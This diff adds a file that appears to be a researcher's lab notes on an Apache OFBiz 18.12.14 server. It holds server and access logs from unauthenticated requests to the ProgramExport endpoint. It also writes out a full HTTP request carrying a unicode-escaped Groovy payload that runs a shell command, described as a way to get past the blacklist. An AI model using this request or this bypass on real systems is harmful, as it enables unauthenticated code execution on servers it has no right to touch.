@@ -1,0 +1,219 @@
+2024-08-12 18:49:28,525 |jsse-nio-8443-exec-3 |ControlEventListener          |I| Creating session:  hidden sessionId by default.
+2024-08-12 18:49:28,525 |jsse-nio-8443-exec-3 |LoginWorker                   |W| Received a null Security object from HttpServletRequest
+2024-08-12 18:49:28,525 |jsse-nio-8443-exec-3 |ControlServlet                |T| [[[main(Domain:https://demo-trunk.ofbiz.apache.org)] Request Begun, encoding=[UTF-8]- total:0.0,since last(Begin):0.0]]
+2024-08-12 18:49:28,525 |jsse-nio-8443-exec-3 |VisitHandler                  |I| Found visitorId [null] in cookie
+2024-08-12 18:49:28,537 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.001s, 112 requests, 78 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/webtools/webapp/webtools/WEB-INF/controller.xml
+2024-08-12 18:49:28,553 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.001s, 48 requests, 22 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/common-controller.xml
+2024-08-12 18:49:28,558 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.0s, 0 requests, 0 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/handlers-controller.xml
+2024-08-12 18:49:28,563 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.0s, 26 requests, 10 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/portal-controller.xml
+2024-08-12 18:49:28,568 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.0s, 30 requests, 13 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/security-controller.xml
+2024-08-12 18:49:28,573 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.0s, 5 requests, 0 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/tempexpr-controller.xml
+2024-08-12 18:49:28,573 |jsse-nio-8443-exec-3 |RequestHandler                |I| This is the first request in this visit. Hidden sessionId by default.
+2024-08-12 18:49:28,573 |jsse-nio-8443-exec-3 |JWTManager                    |I| Internal single sign on is disabled.
+!! 2024-08-12 18:49:28,574 |jsse-nio-8443-exec-3 |RequestHandler                |I| Rendering View [ProgramExport].  Hidden sessionId by default.
+!!(one time) 2024-08-12 18:49:28,580 |jsse-nio-8443-exec-3 |ScreenFactory                 |I| Got 20 screens in 0.003s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/webtools/widget/EntityScreens.xml
+!!(one time) 2024-08-12 18:49:28,672 |jsse-nio-8443-exec-3 |ScreenFactory                 |I| Got 11 screens in 0.003s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/webtools/widget/CommonScreens.xml
+!!(one time) 2024-08-12 18:49:28,676 |jsse-nio-8443-exec-3 |ScreenFactory                 |I| Got 27 screens in 0.003s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/widget/CommonScreens.xml
+!!(one time) 2024-08-12 18:49:28,707 |jsse-nio-8443-exec-3 |ScreenFactory                 |I| Got 26 screens in 0.003s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/themes/common-theme/widget/CommonScreens.xml
+2024-08-12 18:49:28,717 |jsse-nio-8443-exec-3 |ServerHitBin                  |I| Visit delegatorName=default, ServerHitBin delegatorName=default
+2024-08-12 18:49:28,718 |jsse-nio-8443-exec-3 |ControlServlet                |T| [[[main(Domain:https://demo-trunk.ofbiz.apache.org)] Request Done- total:0.193,since last([main(Domain:http...):0.193]]
+2024-08-12 18:49:28,731 |sse-nio-8443-exec-10 |ControlEventListener          |I| Creating session:  hidden sessionId by default.
+2024-08-12 18:49:28,731 |sse-nio-8443-exec-10 |LoginWorker                   |W| Received a null Security object from HttpServletRequest
+2024-08-12 18:49:28,731 |sse-nio-8443-exec-10 |ControlServlet                |T| [[[main(Domain:https://demo-trunk.ofbiz.apache.org)] Request Begun, encoding=[UTF-8]- total:0.0,since last(Begin):0.0]]
+2024-08-12 18:49:28,731 |sse-nio-8443-exec-10 |VisitHandler                  |I| Found visitorId [null] in cookie
+2024-08-12 18:49:28,734 |sse-nio-8443-exec-10 |RequestHandler                |I| This is the first request in this visit. Hidden sessionId by default.
+2024-08-12 18:49:28,734 |sse-nio-8443-exec-10 |JWTManager                    |I| Internal single sign on is disabled.
+2024-08-12 18:49:28,736 |sse-nio-8443-exec-10 |RequestHandler                |I| Rendering View [ProgramExport].  Hidden sessionId by default.
+2024-08-12 18:49:28,781 |sse-nio-8443-exec-10 |ServerHitBin                  |I| Visit delegatorName=default, ServerHitBin delegatorName=default
+2024-08-12 18:49:28,782 |sse-nio-8443-exec-10 |ControlServlet                |T| [[[main(Domain:https://demo-trunk.ofbiz.apache.org)] Request Done- total:0.051,since last([main(Domain:http...):0.051]]
+2024-08-12 18:49:28,794 |jsse-nio-8443-exec-7 |ControlEventListener          |I| Creating session:  hidden sessionId by default.
+2024-08-12 18:49:28,794 |jsse-nio-8443-exec-7 |LoginWorker                   |W| Received a null Security object from HttpServletRequest
+2024-08-12 18:49:28,794 |jsse-nio-8443-exec-7 |ControlServlet                |T| [[[main(Domain:https://demo-trunk.ofbiz.apache.org)] Request Begun, encoding=[UTF-8]- total:0.0,since last(Begin):0.0]]
+2024-08-12 18:49:28,794 |jsse-nio-8443-exec-7 |VisitHandler                  |I| Found visitorId [null] in cookie
+2024-08-12 18:49:28,796 |jsse-nio-8443-exec-7 |RequestHandler                |I| This is the first request in this visit. Hidden sessionId by default.
+2024-08-12 18:49:28,797 |jsse-nio-8443-exec-7 |JWTManager                    |I| Internal single sign on is disabled.
+2024-08-12 18:49:28,798 |jsse-nio-8443-exec-7 |RequestHandler                |I| Rendering View [ProgramExport].  Hidden sessionId by default.
+2024-08-12 18:49:28,833 |jsse-nio-8443-exec-7 |ServerHitBin                  |I| Visit delegatorName=default, ServerHitBin delegatorName=default
+2024-08-12 18:49:28,834 |jsse-nio-8443-exec-7 |ControlServlet                |T| [[[main(Domain:https://demo-trunk.ofbiz.apache.org)] Request Done- total:0.04,since last([main(Domain:http...):0.04]]
+
+"normal request"
+
+2024-08-12 18:51:28,367 |jsse-nio-8443-exec-3 |ControlEventListener          |I| Creating session:  hidden sessionId by default.
+2024-08-12 18:51:28,368 |jsse-nio-8443-exec-3 |LoginWorker                   |W| Received a null Security object from HttpServletRequest
+2024-08-12 18:51:28,368 |jsse-nio-8443-exec-3 |ControlServlet                |T| [[[main(Domain:https://demo-trunk.ofbiz.apache.org)] Request Begun, encoding=[UTF-8]- total:0.0,since last(Begin):0.0]]
+2024-08-12 18:51:28,370 |jsse-nio-8443-exec-3 |VisitHandler                  |I| Found visitorId [10000] in cookie
+2024-08-12 18:51:28,384 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.001s, 268 requests, 110 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/applications/party/webapp/partymgr/WEB-INF/controller.xml
+2024-08-12 18:51:28,393 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.001s, 48 requests, 22 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/common-controller.xml
+2024-08-12 18:51:28,400 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.0s, 0 requests, 0 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/handlers-controller.xml
+2024-08-12 18:51:28,406 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.001s, 30 requests, 13 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/security-controller.xml
+2024-08-12 18:51:28,413 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.0s, 4 requests, 0 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/applications/commonext/webapp/WEB-INF/controller.xml
+2024-08-12 18:51:28,423 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.002s, 379 requests, 154 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/applications/content/webapp/content/WEB-INF/controller.xml
+2024-08-12 18:51:28,423 |jsse-nio-8443-exec-3 |RequestHandler                |I| This is the first request in this visit. Hidden sessionId by default.
+2024-08-12 18:51:28,424 |jsse-nio-8443-exec-3 |ExternalLoginKeysManager      |W| Could not find userLogin for external login key: EL01cd3606-e3a1-406a-8ee3-0bb3e1614a25
+2024-08-12 18:51:28,425 |jsse-nio-8443-exec-3 |JWTManager                    |I| Internal single sign on is disabled.
+2024-08-12 18:51:28,431 |jsse-nio-8443-exec-3 |RequestHandler                |I| Rendering View [login].  Hidden sessionId by default.
+2024-08-12 18:51:28,446 |jsse-nio-8443-exec-3 |ScreenFactory                 |I| Got 27 screens in 0.013s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/widget/CommonScreens.xml
+2024-08-12 18:51:28,482 |jsse-nio-8443-exec-3 |ScreenFactory                 |I| Got 26 screens in 0.003s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/themes/common-theme/widget/CommonScreens.xml
+2024-08-12 18:51:28,485 |jsse-nio-8443-exec-3 |ScreenFactory                 |I| Got 4 screens in 0.003s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/applications/party/widget/partymgr/CommonScreens.xml
+2024-08-12 18:51:28,538 |jsse-nio-8443-exec-3 |UtilProperties                |I| ResourceBundle PartyUiLabels (en_US) created in 0.053s with 833 properties
+2024-08-12 18:51:28,564 |jsse-nio-8443-exec-3 |UtilProperties                |I| ResourceBundle MarketingUiLabels (en_US) created in 0.026s with 295 properties
+2024-08-12 18:51:28,640 |jsse-nio-8443-exec-3 |UtilProperties                |I| ResourceBundle AccountingUiLabels (en_US) created in 0.075s with 1604 properties
+2024-08-12 18:51:28,670 |jsse-nio-8443-exec-3 |UtilProperties                |I| ResourceBundle WorkEffortUiLabels (en_US) created in 0.029s with 484 properties
+2024-08-12 18:51:28,703 |jsse-nio-8443-exec-3 |UtilProperties                |I| ResourceBundle ContentUiLabels (en_US) created in 0.033s with 567 properties
+2024-08-12 18:51:28,713 |jsse-nio-8443-exec-3 |UtilProperties                |I| ResourceBundle SecurityUiLabels (en_US) created in 0.01s with 0 properties
+2024-08-12 18:51:28,754 |jsse-nio-8443-exec-3 |UtilProperties                |I| ResourceBundle CommonUiLabels (en_US) created in 0.04s with 0 properties
+2024-08-12 18:51:28,807 |jsse-nio-8443-exec-3 |UtilProperties                |I| ResourceBundle OrderUiLabels (en_US) created in 0.053s with 989 properties
+2024-08-12 18:51:28,898 |jsse-nio-8443-exec-3 |UtilProperties                |I| ResourceBundle ProductUiLabels (en_US) created in 0.091s with 2651 properties
+2024-08-12 18:51:28,918 |jsse-nio-8443-exec-3 |UtilProperties                |I| ResourceBundle HumanResUiLabels (en_US) created in 0.02s with 318 properties
+2024-08-12 18:51:28,936 |jsse-nio-8443-exec-3 |ScreenFactory                 |I| Got 1 screens in 0.017s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/applications/commonext/widget/CommonScreens.xml
+2024-08-12 18:51:28,950 |jsse-nio-8443-exec-3 |UtilProperties                |I| ResourceBundle CommonExtUiLabels (en_US) created in 0.013s with 7 properties
+2024-08-12 18:51:28,950 |jsse-nio-8443-exec-3 |PrimaryKeyFinder              |I| Returning null because found incomplete primary key in find: [GenericEntity:PartyNameView][partyId,null()]
+2024-08-12 18:51:29,033 |jsse-nio-8443-exec-3 |ServiceDispatcher             |T| Sync service [partymgr/getLastSystemInfoNote] finished in [39] milliseconds
+2024-08-12 18:51:29,119 |jsse-nio-8443-exec-3 |ServerHitBin                  |I| Visit delegatorName=default, ServerHitBin delegatorName=default
+2024-08-12 18:51:29,120 |jsse-nio-8443-exec-3 |ControlServlet                |T| [[[main(Domain:https://demo-trunk.ofbiz.apache.org)] Request Done- total:0.752,since last([main(Domain:http...):0.752]]
+2024-08-12 18:51:32,160 |jsse-nio-8443-exec-4 |LoginWorker                   |W| Received a null Security object from HttpServletRequest
+2024-08-12 18:51:32,160 |jsse-nio-8443-exec-4 |ControlServlet                |T| [[[login(Domain:https://demo-trunk.ofbiz.apache.org)] Request Begun, encoding=[UTF-8]- total:0.0,since last(Begin):0.0]]
+2024-08-12 18:51:32,162 |jsse-nio-8443-exec-4 |JWTManager                    |I| Internal single sign on is disabled.
+2024-08-12 18:51:32,163 |jsse-nio-8443-exec-4 |LoginWorker                   |I| Setting default delegator
+2024-08-12 18:51:32,193 |jsse-nio-8443-exec-4 |ServiceDispatcher             |T| Sync service [partymgr/userLogin] finished in [28] milliseconds
+2024-08-12 18:51:32,193 |jsse-nio-8443-exec-4 |VisitHandler                  |I| Found visitorId [10000] in cookie
+2024-08-12 18:51:32,198 |jsse-nio-8443-exec-4 |ServiceDispatcher             |T| Sync service [partymgr/preferenceGetSetPermission] finished in [1] milliseconds
+2024-08-12 18:51:32,206 |jsse-nio-8443-exec-4 |ServiceDispatcher             |T| Sync service [partymgr/setUserPreference] finished in [12] milliseconds
+2024-08-12 18:51:32,216 |jsse-nio-8443-exec-4 |ServiceDispatcher             |T| Sync service [partymgr/getUserPreference] finished in [1] milliseconds
+2024-08-12 18:51:32,218 |jsse-nio-8443-exec-4 |ServiceDispatcher             |T| Sync service [partymgr/getUserPreference] finished in [2] milliseconds
+2024-08-12 18:51:32,232 |jsse-nio-8443-exec-4 |RequestHandler                |I| Ran Event [java:org.apache.ofbiz.webapp.control.LoginWorker#login] from [request], result is [success]
+2024-08-12 18:51:32,233 |jsse-nio-8443-exec-4 |RequestHandler                |I| [Doing Previous Request]: /main Hidden sessionId by default.
+2024-08-12 18:51:32,233 |jsse-nio-8443-exec-4 |RequestHandler                |I| Sending redirect to: [https://demo-trunk.ofbiz.apache.org:8443/partymgr/control/main?externalLoginKey=EL01cd3606-e3a1-406a-8ee3-0bb3e1614a25].  Hidden sessionId by default.
+2024-08-12 18:51:32,234 |jsse-nio-8443-exec-4 |ServerHitBin                  |I| Visit delegatorName=default, ServerHitBin delegatorName=default
+2024-08-12 18:51:32,235 |jsse-nio-8443-exec-4 |ControlServlet                |T| [[[login(Domain:https://demo-trunk.ofbiz.apache.org)] Request Done- total:0.075,since last([login(Domain:htt...):0.075]]
+2024-08-12 18:51:32,244 |jsse-nio-8443-exec-8 |LoginWorker                   |W| Received a null Security object from HttpServletRequest
+2024-08-12 18:51:32,244 |jsse-nio-8443-exec-8 |ControlServlet                |T| [[[main(Domain:https://demo-trunk.ofbiz.apache.org)] Request Begun, encoding=[UTF-8]- total:0.0,since last(Begin):0.0]]
+2024-08-12 18:51:32,245 |jsse-nio-8443-exec-8 |ExternalLoginKeysManager      |W| Could not find userLogin for external login key: EL01cd3606-e3a1-406a-8ee3-0bb3e1614a25
+2024-08-12 18:51:32,245 |jsse-nio-8443-exec-8 |JWTManager                    |I| Internal single sign on is disabled.
+2024-08-12 18:51:32,260 |jsse-nio-8443-exec-8 |RequestHandler                |I| Rendering View [main].  Hidden sessionId by default.
+2024-08-12 18:51:32,261 |jsse-nio-8443-exec-8 |ServiceDispatcher             |T| Sync service [partymgr/getUserPreferenceGroup] finished in [1] milliseconds
+2024-08-12 18:51:32,271 |jsse-nio-8443-exec-8 |ScreenFactory                 |I| Got 42 screens in 0.009s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/applications/party/widget/partymgr/PartyScreens.xml
+2024-08-12 18:51:32,300 |jsse-nio-8443-exec-8 |ServiceDispatcher             |T| Sync service [partymgr/getLastSystemInfoNote] finished in [3] milliseconds
+2024-08-12 18:51:32,444 |jsse-nio-8443-exec-8 |Log                           |W| [CommonPermissionServices.xml#genericBasePermissionCheck line 59] This simple-method-call is deprecated! Please use a service-call of genericBasePermissionCheck instead.
+2024-08-12 18:51:32,481 |jsse-nio-8443-exec-8 |ServiceDispatcher             |T| Sync service [partymgr/genericBasePermissionCheck] finished in [35] milliseconds
+2024-08-12 18:51:32,496 |jsse-nio-8443-exec-8 |UtilProperties                |I| ResourceBundle DefaultMessagesUiLabels (en_US) created in 0.015s with 11 properties
+2024-08-12 18:51:32,497 |jsse-nio-8443-exec-8 |ServiceEcaRule                |I| For Service ECA [partyBasePermissionCheck] on [return] got false for condition: [hasPermission][equals][false][true][Boolean]
+2024-08-12 18:51:32,497 |jsse-nio-8443-exec-8 |ServiceDispatcher             |T| Sync service [partymgr/partyBasePermissionCheck] finished in [63] milliseconds
+2024-08-12 18:51:32,501 |jsse-nio-8443-exec-8 |Log                           |W| [CommonPermissionServices.xml#genericBasePermissionCheck line 59] This simple-method-call is deprecated! Please use a service-call of genericBasePermissionCheck instead.
+2024-08-12 18:51:32,502 |jsse-nio-8443-exec-8 |ServiceEcaRule                |I| For Service ECA [partyBasePermissionCheck] on [return] got false for condition: [hasPermission][equals][false][true][Boolean]
+2024-08-12 18:51:32,502 |jsse-nio-8443-exec-8 |ServiceDispatcher             |T| Sync service [partymgr/partyBasePermissionCheck] finished in [1] milliseconds
+2024-08-12 18:51:32,609 |jsse-nio-8443-exec-8 |UtilProperties                |I| ResourceBundle PartyEntityLabels (en_US) created in 0.024s with 301 properties
+2024-08-12 18:51:32,707 |jsse-nio-8443-exec-8 |ModelService                  |I| Set default value [N] for parameter [noConditionFind]
+2024-08-12 18:51:32,714 |jsse-nio-8443-exec-8 |PartyServices                 |I| In findParty mainCond=((statusId IS NULL OR statusId <> 'PARTY_DISABLED'))
+2024-08-12 18:51:32,714 |jsse-nio-8443-exec-8 |ServiceDispatcher             |T| Sync service [partymgr/performFindParty] finished in [7] milliseconds
+2024-08-12 18:51:32,723 |jsse-nio-8443-exec-8 |ServerHitBin                  |I| Visit delegatorName=default, ServerHitBin delegatorName=default
+2024-08-12 18:51:32,724 |jsse-nio-8443-exec-8 |ControlServlet                |T| [[[main(Domain:https://demo-trunk.ofbiz.apache.org)] Request Done- total:0.48,since last([main(Domain:http...):0.48]]
+
+
+root@acsc2024:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/runtime/logs# cat access_log..2024-08-12 
+172.16.240.132 - - [12/Aug/2024:18:42:18 +0200] "GET /webtools/control/LogView HTTP/1.1" 200 2357 "https://demo-trunk.ofbiz.apache.org:8443/webtools/control/main?externalLoginKey=EL271e3f27-c271-472a-95fa-86056c377a6d" "Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0"
+172.16.240.132 - - [12/Aug/2024:18:42:21 +0200] "POST /webtools/control/login HTTP/1.1" 302 - "https://demo-trunk.ofbiz.apache.org:8443/webtools/control/LogView" "Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0"
+172.16.240.132 - - [12/Aug/2024:18:42:21 +0200] "GET /webtools/control/LogView HTTP/1.1" 200 23797 "https://demo-trunk.ofbiz.apache.org:8443/webtools/control/LogView" "Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0"
+172.16.240.132 - - [12/Aug/2024:18:42:24 +0200] "POST /webtools/control/main/ProgramExport HTTP/1.1" 200 1955 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+172.16.240.132 - - [12/Aug/2024:18:43:33 +0200] "POST /webtools/control/main/ProgramExport HTTP/1.1" 200 1955 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+172.16.240.132 - - [12/Aug/2024:18:45:22 +0200] "POST /webtools/control/main/ProgramExport HTTP/1.1" 200 1955 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+172.16.240.132 - - [12/Aug/2024:18:45:22 +0200] "POST /webtools/control/main/ProgramExport HTTP/1.1" 200 1955 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+172.16.240.132 - - [12/Aug/2024:18:45:22 +0200] "POST /webtools/control/main/ProgramExport HTTP/1.1" 200 1955 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+172.16.240.132 - - [12/Aug/2024:18:49:28 +0200] "POST /webtools/control/main/ProgramExport HTTP/1.1" 200 1956 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+172.16.240.132 - - [12/Aug/2024:18:49:28 +0200] "POST /webtools/control/main/ProgramExport HTTP/1.1" 200 1956 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+172.16.240.132 - - [12/Aug/2024:18:49:28 +0200] "POST /webtools/control/main/ProgramExport HTTP/1.1" 200 1956 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+172.16.240.132 - - [12/Aug/2024:18:51:29 +0200] "GET /partymgr/control/main?externalLoginKey=EL01cd3606-e3a1-406a-8ee3-0bb3e1614a25 HTTP/1.1" 200 2407 "https://demo-trunk.ofbiz.apache.org:8443/webtools/control/LogView" "Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0"
+172.16.240.132 - - [12/Aug/2024:18:51:32 +0200] "POST /partymgr/control/login HTTP/1.1" 302 - "https://demo-trunk.ofbiz.apache.org:8443/partymgr/control/main?externalLoginKey=EL01cd3606-e3a1-406a-8ee3-0bb3e1614a25" "Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0"
+172.16.240.132 - - [12/Aug/2024:18:51:32 +0200] "GET /partymgr/control/main?externalLoginKey=EL01cd3606-e3a1-406a-8ee3-0bb3e1614a25 HTTP/1.1" 200 15348 "https://demo-trunk.ofbiz.apache.org:8443/partymgr/control/main?externalLoginKey=EL01cd3606-e3a1-406a-8ee3-0bb3e1614a25" "Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0"
+
+sending unicode escaped String
+
+POST /webtools/control/TestService/ProgramExport HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Host: demo-trunk.ofbiz.apache.org:8443
+Content-Length: 296
+
+groovyProgram=\u0074\u0068\u0072\u006F\u0077\u0020\u006E\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006F\u006E\u0028\u0027\u0075\u006E\u0061\u006D\u0065\u0020\u002D\u0061\u0027\u002E\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002E\u0074\u0065\u0078\u0074\u0029\u003B
+
+
+root@acsc2024:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/runtime/logs# 2024-08-12 19:35:35,588 |jsse-nio-8443-exec-3 |ControlEventListener          |I| Creating session:  hidden sessionId by default.
+2024-08-12 19:35:35,588 |jsse-nio-8443-exec-3 |LoginWorker                   |W| Received a null Security object from HttpServletRequest
+2024-08-12 19:35:35,588 |jsse-nio-8443-exec-3 |ControlServlet                |T| [[[TestService(Domain:https://demo-trunk.ofbiz.apache.org)] Request Begun, encoding=[UTF-8]- total:0.0,since last(Begin):0.0]]
+2024-08-12 19:35:35,588 |jsse-nio-8443-exec-3 |VisitHandler                  |I| Found visitorId [null] in cookie
+2024-08-12 19:35:35,596 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.001s, 112 requests, 78 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/webtools/webapp/webtools/WEB-INF/controller.xml
+2024-08-12 19:35:35,600 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.0s, 48 requests, 22 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/common-controller.xml
+2024-08-12 19:35:35,604 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.0s, 0 requests, 0 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/handlers-controller.xml
+2024-08-12 19:35:35,608 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.001s, 26 requests, 10 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/portal-controller.xml
+2024-08-12 19:35:35,611 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.0s, 30 requests, 13 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/security-controller.xml
+2024-08-12 19:35:35,615 |jsse-nio-8443-exec-3 |ConfigXMLReader               |I| controller loaded: 0.0s, 5 requests, 0 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/tempexpr-controller.xml
+2024-08-12 19:35:35,615 |jsse-nio-8443-exec-3 |RequestHandler                |I| This is the first request in this visit. Hidden sessionId by default.
+2024-08-12 19:35:35,615 |jsse-nio-8443-exec-3 |JWTManager                    |I| Internal single sign on is disabled.
+2024-08-12 19:35:35,616 |jsse-nio-8443-exec-3 |ModelService                  |I| Set default value [999.9999] for parameter [defaultValue]
+2024-08-12 19:35:35,616 |jsse-nio-8443-exec-3 |ServiceEcaCondition           |I| From Field (message) is not found in context for testScv, defaulting to null.
+2024-08-12 19:35:35,616 |jsse-nio-8443-exec-3 |ServiceEcaRule                |I| For Service ECA [testScv] on [invoke] got false for condition: [message][equals][auto][true][String]
+2024-08-12 19:35:35,616 |jsse-nio-8443-exec-3 |CommonServices                |I| ---- SVC-CONTEXT: defaultValue => 999.9999
+2024-08-12 19:35:35,616 |jsse-nio-8443-exec-3 |CommonServices                |I| ---- SVC-CONTEXT: timeZone => sun.util.calendar.ZoneInfo[id="Europe/Vienna",offset=3600000,dstSavings=3600000,useDaylight=true,transitions=139,lastRule=java.util.SimpleTimeZone[id=Europe/Vienna,offset=3600000,dstSavings=3600000,useDaylight=true,startYear=0,startMode=2,startMonth=2,startDay=-1,startDayOfWeek=1,startTime=3600000,startTimeMode=2,endMode=2,endMonth=9,endDay=-1,endDayOfWeek=1,endTime=3600000,endTimeMode=2]]
+2024-08-12 19:35:35,616 |jsse-nio-8443-exec-3 |CommonServices                |I| ---- SVC-CONTEXT: locale => en
+2024-08-12 19:35:35,616 |jsse-nio-8443-exec-3 |CommonServices                |I| ----- SVC: webtools -----
+2024-08-12 19:35:35,616 |jsse-nio-8443-exec-3 |RequestHandler                |I| Ran Event [service:#testScv] from [request], result is [success]
+2024-08-12 19:35:35,616 |jsse-nio-8443-exec-3 |RequestHandler                |I| Rendering View [ProgramExport].  Hidden sessionId by default.
+2024-08-12 19:35:35,617 |jsse-nio-8443-exec-3 |ServiceDispatcher             |T| Sync service [webtools/getUserPreferenceGroup] finished in [1] milliseconds
+2024-08-12 19:35:35,619 |jsse-nio-8443-exec-3 |ScreenFactory                 |I| Got 20 screens in 0.002s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/webtools/widget/EntityScreens.xml
+2024-08-12 19:35:35,689 |jsse-nio-8443-exec-3 |ScreenFactory                 |I| Got 11 screens in 0.002s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/webtools/widget/CommonScreens.xml
+2024-08-12 19:35:35,691 |jsse-nio-8443-exec-3 |ScreenFactory                 |I| Got 27 screens in 0.001s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/widget/CommonScreens.xml
+2024-08-12 19:35:35,713 |jsse-nio-8443-exec-3 |ScreenFactory                 |I| Got 26 screens in 0.002s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/themes/common-theme/widget/CommonScreens.xml
+2024-08-12 19:35:35,717 |jsse-nio-8443-exec-3 |ServerHitBin                  |I| Visit delegatorName=default, ServerHitBin delegatorName=default
+2024-08-12 19:35:35,718 |jsse-nio-8443-exec-3 |ControlServlet                |T| [[[TestService(Domain:https://demo-trunk.ofbiz.apache.org)] Request Done- total:0.13,since last([TestService(Doma...):0.13]]
+
+
+
+without this it will hit the blacklist
+
+    <div id="content-messages" class="content-messages errorMessage"
+        onclick="document.getElementById('content-messages').parentNode.removeChild(this)">
+      <p>The Following Errors Occurred:</p>
+        <p>Not executed for security reason</p>
+    </div>
+
+
+2024-08-12 19:36:34,745 |sse-nio-8443-exec-10 |ControlEventListener          |I| Creating session:  hidden sessionId by default.
+2024-08-12 19:36:34,745 |sse-nio-8443-exec-10 |LoginWorker                   |W| Received a null Security object from HttpServletRequest
